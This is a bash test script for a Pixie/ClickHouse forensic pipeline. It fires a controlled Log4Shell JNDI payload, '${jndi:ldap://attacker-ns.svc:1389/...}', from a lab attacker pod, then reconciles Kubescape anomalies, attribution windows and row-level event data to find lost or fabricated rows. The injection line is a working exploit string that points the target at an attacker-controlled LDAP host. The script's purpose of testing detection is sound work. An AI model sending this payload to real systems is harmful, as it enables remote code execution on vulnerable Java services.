#!/usr/bin/env bash

# Copyright 2018- The Pixie Authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

# exp_pipeline_reconcile.sh — full-pipeline reconciliation, runnable-now hops.
# Controlled log4j attack fixture. NODE-SIDE (kubectl + px local on dev-machine).
#
#   R3  kubescape_logs -> adaptive_attribution : distinct anomaly_hash >= watermark vs attrib rows
#   R4  attribution(open) -> CH presence       : open-window pods that DID/って didn't land protocol rows
#   R5+R6 (combined) PEM <-> CH at ROW LEVEL   : natural composite key per (pod, table),
#         px-direct PEM key-set vs CH key-set → LOSS (PEM\CH), FAB (CH\PEM), dup factor.
#
# Row identity = natural composite key (NO minted probe, NO upid/time_ format risk):
#   http_events : remote_addr|remote_port|req_method|req_path|resp_status|latency
#   dns_events  : remote_addr|remote_port|latency|req_body|resp_body
# All string/int columns px (-o json) and CH emit identically. Within ONE pod+window
# these are unique per event (latency is ns), so dropping upid/time_ loses nothing.
set -uo pipefail
CLUSTER=${CLUSTER:-547d0a15-4004-435e-aea1-c13e596eb976}
CHPOD=${CHPOD:-chi-forensic-soc-db-soc-cluster-0-0-0}
NS=${NS:-log4j-poc}
PODS="${PODS:-frontend backend}"
SETTLE=${SETTLE:-160}
O=/tmp/piprec; mkdir -p "$O"
chq(){ kubectl -n clickhouse exec "$CHPOD" -c clickhouse -- clickhouse-client -q "$1" 2>/dev/null; }
pxjson(){ export PX_CLOUD_ADDR="$(grep -E '^PX_CLOUD_ADDR=' /tmp/pixie-keys.env|cut -d= -f2-)"; px run -o json -f "$1" -c "$CLUSTER" 2>/dev/null; }
log(){ echo "$@" | tee -a "$O/RESULT.txt"; }
: > "$O/RESULT.txt"

FE=$(kubectl -n "$NS" get svc frontend -o jsonpath='{.spec.clusterIP}')
log "=== controlled log4j attack + chain load (fixture) $(date -u +%H:%M:%S) ==="
for i in $(seq 1 40); do
  kubectl -n attacker-ns exec deploy/attacker -- sh -c \
    "curl -s -m3 \"http://frontend.log4j-poc.svc.cluster.local/api/products?q=\\\${jndi:ldap://attacker-ns.svc:1389/x$i}\" >/dev/null 2>&1" >/dev/null 2>&1 || true
  kubectl -n "$NS" run rg-$i --image=busybox:1.36 --restart=Never --rm --attach=false -- \
    wget -qO- "http://$FE/api/products?probe=$i" >/dev/null 2>&1 || true
  sleep 0.3
done
log "attack+load fired; settling ${SETTLE}s for AE sweep+write"
sleep "$SETTLE"

# ---- R3: kubescape_logs -> adaptive_attribution ----
log ""; log "=== R3 kubescape_logs -> adaptive_attribution ==="
WM=$(chq "SELECT max(watermark) FROM forensic_db.trigger_watermark FINAL")
NORM="multiIf(event_time<10000000000, event_time*1000000000, event_time<10000000000000, event_time*1000000, event_time)"
ANOM=$(chq "SELECT uniqExact(cityHash64(RuntimeProcessDetails, RuntimeK8sDetails)) FROM forensic_db.kubescape_logs WHERE $NORM >= ${WM:-0}")
ATTR=$(chq "SELECT uniqExact(anomaly_hash) FROM forensic_db.adaptive_attribution")
log "  watermark_ns=$WM  distinct_anomaly_signatures>=wm=$ANOM  attribution_hashes=$ATTR"
log "  (R3 healthy when attribution_hashes tracks the distinct anomalies above the watermark)"

# ---- R4: open windows vs CH protocol presence ----
log ""; log "=== R4 open attribution windows vs CH protocol presence ==="
chq "SELECT pod, comm, countIf(t_end>now()) AS open FROM forensic_db.adaptive_attribution GROUP BY pod, comm ORDER BY open DESC LIMIT 12 FORMAT TSV" | while IFS=$'\t' read -r pod comm open; do
  hp=$(chq "SELECT count() FROM forensic_db.http_events WHERE pod='$NS/$pod' AND time_ > now()-INTERVAL 6 MINUTE")
  dp=$(chq "SELECT count() FROM forensic_db.dns_events  WHERE pod='$NS/$pod' AND time_ > now()-INTERVAL 6 MINUTE")
  cp=$(chq "SELECT count() FROM forensic_db.conn_stats  WHERE pod='$NS/$pod' AND time_ > now()-INTERVAL 6 MINUTE")
  log "  pod=$pod comm=$comm open=$open  CH(last6m): http=$hp dns=$dp conn=$cp"
done

# ---- R5+R6 combined: PEM <-> CH row-level by natural composite key ----
recon(){ # $1=pod $2=table $3=ch_key_expr $4=pxl_cols(comma) $5=py_key
  local pod="$1" tbl="$2" chkey="$3" cols="$4" pykey="$5"
  cat > "$O/q.pxl" <<PXL
import px
df = px.DataFrame('$tbl', start_time='-7m')
df.pod = px.upid_to_pod_name(df.upid)
df = df[df.pod == '$NS/$pod']
px.display(df[[$cols]], '$tbl')
PXL
  pxjson "$O/q.pxl" > "$O/pem_${pod}_${tbl}.json"
  python3 - "$O/pem_${pod}_${tbl}.json" "$pykey" > "$O/pem_${pod}_${tbl}.keys" <<'PY'
import sys, json
rows=[]
for ln in open(sys.argv[1]):
    ln=ln.strip()
    if not ln: continue
    try: rows.append(json.loads(ln))
    except: pass
fields=sys.argv[2].split(",")
seen=set()
for r in rows:
    vals=[str(r.get(f,"")) for f in fields]
    if any(v for v in vals):          # skip degenerate all-empty-field rows
        seen.add("|".join(vals))
if seen:                              # empty set → 0-byte file (not one blank line)
    print("\n".join(sorted(seen)))
PY
  chq "SELECT DISTINCT $chkey FROM forensic_db.$tbl WHERE pod='$NS/$pod' AND time_ > now()-INTERVAL 7 MINUTE FORMAT TSV" | sort -u > "$O/ch_${pod}_${tbl}.keys"
  local pem=$(wc -l < "$O/pem_${pod}_${tbl}.keys") ch=$(wc -l < "$O/ch_${pod}_${tbl}.keys")
  local loss=$(comm -23 "$O/pem_${pod}_${tbl}.keys" "$O/ch_${pod}_${tbl}.keys" | wc -l)
  local fab=$(comm -13 "$O/pem_${pod}_${tbl}.keys" "$O/ch_${pod}_${tbl}.keys" | wc -l)
  local chtot=$(chq "SELECT count() FROM forensic_db.$tbl WHERE pod='$NS/$pod' AND time_ > now()-INTERVAL 7 MINUTE")
  local dup="n/a"; [ "$ch" -gt 0 ] && dup=$(awk "BEGIN{printf \"%.2f\",$chtot/$ch}")
  log "  [$pod/$tbl] PEM_distinct=$pem CH_distinct=$ch (CH_total=$chtot dup=${dup}x) | LOSS(PEM\\CH)=$loss FAB(CH\\PEM)=$fab"
  if [ "$loss" -gt 0 ]; then log "    LOST sample:"; comm -23 "$O/pem_${pod}_${tbl}.keys" "$O/ch_${pod}_${tbl}.keys" | head -3 | sed 's/^/      /' | tee -a "$O/RESULT.txt"; fi
}
log ""; log "=== R5+R6 PEM<->CH row-level (natural composite key) ==="
for pod_pref in $PODS; do
  pod=$(kubectl -n "$NS" get pods --no-headers 2>/dev/null | awk -v p="^$pod_pref" '$1 ~ p {print $1; exit}')
  [ -z "$pod" ] && { log "  (no pod for prefix $pod_pref)"; continue; }
  recon "$pod" http_events \
    "concat(remote_addr,'|',toString(remote_port),'|',req_method,'|',req_path,'|',toString(resp_status),'|',toString(latency))" \
    "'remote_addr','remote_port','req_method','req_path','resp_status','latency'" \
    "remote_addr,remote_port,req_method,req_path,resp_status,latency"
  recon "$pod" dns_events \
    "concat(remote_addr,'|',toString(remote_port),'|',toString(latency),'|',req_body,'|',resp_body)" \
    "'remote_addr','remote_port','latency','req_body','resp_body'" \
    "remote_addr,remote_port,latency,req_body,resp_body"
done
log ""; log "DONE $(date -u +%H:%M:%S)  (LOSS>0 = AE wrote fewer rows than Pixie had = the bug)"
